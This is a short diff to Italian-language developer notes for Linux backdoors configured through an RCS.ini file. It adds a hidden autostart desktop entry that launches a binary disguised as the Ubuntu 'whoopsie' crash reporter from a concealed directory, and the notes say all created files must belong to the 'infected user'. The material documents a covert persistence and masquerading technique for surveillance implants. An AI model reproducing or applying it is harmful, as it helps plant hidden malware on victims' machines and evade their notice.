@@ -44,5 +44,14 @@ In RCS.ini le backdoor linux utilizzano:
 
 	~/.config/autostart/.whoopsie-$HDIR.desktop
 
+	Con sintassi:
+
+		[Desktop Entry]
+		Type=Application
+		Exec=$PATH/.reports-$UID-$HDIR/whoopsie-report
+		NoDisplay=true
+		Name=whoopsie
+		Comment=Whoopsie Report Manager
+
 13) Tutte le directory ed i file creati, devono essere di proprieta' dell'utente infettato,
     quindi va fatto un bel chown user:user di tutte le directory e tutti i file creati.
